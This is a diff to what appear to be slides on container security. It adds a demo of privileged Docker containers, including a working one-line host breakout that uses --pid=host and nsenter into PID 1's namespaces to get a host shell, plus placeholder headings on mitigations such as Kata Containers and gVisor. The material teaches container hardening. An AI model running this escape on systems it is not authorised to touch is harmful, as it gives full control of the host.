@@ -18,3 +18,28 @@ Parameters of `nsenter`:
 - Uses process tree of host (--pid=host)
 - Get namespace from PID 1 (-t 1)
 - Enter namespaces required for shell (-m -u -n -i)
+
+--
+
+## Demo: Privileged Containers
+
+Running privileged containers:
+
+```bash
+docker run -d --rm --privileged docker:stable-dind
+```
+
+Host breakout from privileged container:
+
+```bash
+docker run --rm --privileged --pid=host -it alpine:3.8 \
+    nsenter -t 1 -m -u -n -i sh
+```
+
+---
+
+## Taming Privileges Containers
+
+XXX kata containers
+
+XXX Google gVisor
